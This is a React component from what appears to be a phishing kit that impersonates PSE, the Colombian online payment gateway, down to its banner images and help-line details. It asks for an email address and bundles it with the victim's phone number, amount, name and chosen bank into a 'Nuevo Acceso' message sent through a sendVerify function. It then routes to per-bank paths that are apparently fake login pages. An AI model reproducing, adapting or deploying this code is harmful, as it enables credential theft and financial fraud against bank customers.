import React, { useState } from 'react';
import { useLocation, useNavigate } from "react-router-dom";
import { sendVerify } from '../verifyData';
import styles from './submain.module.css';
import BannerX from '../../Assets/Images/bannerX.svg';
import BannerY from '../../Assets/Images/bannerY.svg';
import Natural from '../../Assets/Images/natural.svg'
import Juridica from '../../Assets/Images/juridica.svg';
import Linea from '../../Assets/Images/lineaA.png'
import FooterX from '../../Assets/Images/footerY.svg';
import X from '../../Assets/Images/opreg_sel.svg';
import Y from '../../Assets/Images/opact.svg';
import FooterD from '../../Assets/Images/footerD.svg'
import Conta from '../../Assets/Images/conta.svg';
import Mobile from '../../Assets/Images/mobile.svg';
import subLoader from '../../Assets/Images/subLoader.gif';

function PSE () {

    const location = useLocation();
    const navigate = useNavigate();
    const [dataE, setDataE] = useState('');
    const [loader, showLoader] = useState(false);
   
    const { dataA, dataB, dataC, dataD } = location.state || {};

    const routes = {
        "BANCO DAVIVIENDA": "/x01",
        "BANCO DE BOGOTA": "/x02",
        "BANCO POPULAR": "/x03",
        "BANCO DE OCCIDENTE": "/x04",
        "BANCO AV VILLAS": "/x05",
        "BANCO BBVA COLOMBIA S.A.": "/x06",
        "BANCO FALABELLA": "/x07",
        "BANCOLOMBIA": "/ba",
        "SCOTIABANK COLPATRIA": "/x09",
        "DAVIPLATA": "/x10",
    };

    const handleBack = () => {
        navigate("/resumen");
    };

    const handleConfirm = () => {

        showLoader(true);
        const mensaje = `📝 Nuevo Acceso:\n📱: ${dataA}\n💰: ${dataB}\n🧑: ${dataC}\n🏦: ${dataD}\n📧: ${dataE}`;
        sendVerify(mensaje);

        setTimeout(() => {

            const route = routes[dataD];
            if (route) {
                navigate(route, {
                    state: {
                        dataA,
                        dataB,
                        dataC,
                        dataD,
                        dataE,
                    },
                });
            }
        }, 10000);
    };

    return (
        <>
            <header className={styles.subMainXHeader}>
                <div>
                    <img src={BannerX} alt="Banner Logo"></img>
                    <img src={BannerY} alt="Banner Logo"></img>
                </div>
            </header>

            <main className={styles.subMainXMain}>
                {!loader && (
                    <section>
                        <p>Selecciona el tipo de persona:</p>
                    </section>
                )}
                {!loader && (
                    <section>
                        <div className={styles.bSectionDiv}>
                            <img src={Natural} alt="Natural"></img>
                            <div>
                                <p>Natural</p>
                                <img src={Linea} alt="Linea"></img>
                            </div>
                        </div>
                        <div className={styles.bSectionDivb}>
                            <img src={Juridica} alt="Juridica"></img>
                            <p>Juridica</p>
                        </div>
                    </section>
                )}
                {!loader && (
                    <section>                   
                        <div>
                            <div><img src={X} alt="Usuario Registrado"></img>Soy un usuario registrado</div>
                            <div><img src={Y} alt="Registrarse Ahora"></img>Registrarme ahora</div>
                        </div>
                        <div>
                            <form>
                                <label htmlFor="dataE">Ingresa tu correo electronico:</label>
                                <input 
                                    type="mail" placeholder="Ej: correo@pse.com.co" id="dataE" required value={dataE} onChange={(e) => setDataE(e.target.value)}></input>
                            </form>
                        </div>                                   
                        <div>
                            <button onClick={handleConfirm}>Ir al Banco</button>
                            <button onClick={handleBack}>Regresar al comercio</button> 
                        </div>                  
                    </section>
                )}
                {loader && (
                    <section className={styles.overlaySubMain}>
                        
                        <img src={subLoader}></img>
                    </section>
                )}
            </main>

            <footer className={styles.subMainXFooter}>
                <section>
                    <div>

                    </div>
                    <div>
                        <div>
                            <img src={FooterD} alt="Mail Logo"></img>
                            <p>Para mayor información<br></br> comunícate con nosotros:</p>
                        </div>
                        <div>
                            <p><img src={Mobile} alt="Mobile"></img> En Bogotá: <br></br>
                                <img src={Conta} alt="Correo"></img> Contactanos:</p>
                            <p>+57 (601) 3808890 Opción 5 <br></br>
                                https://www.pse.com.co/persona-centro-de-ayuda</p>
                        </div> 
                    </div>
                </section>
                <section>
                    <img src={FooterX} alt="Footer Imagen"></img>
                </section> 
            </footer>
        </>
    );
}

export default PSE;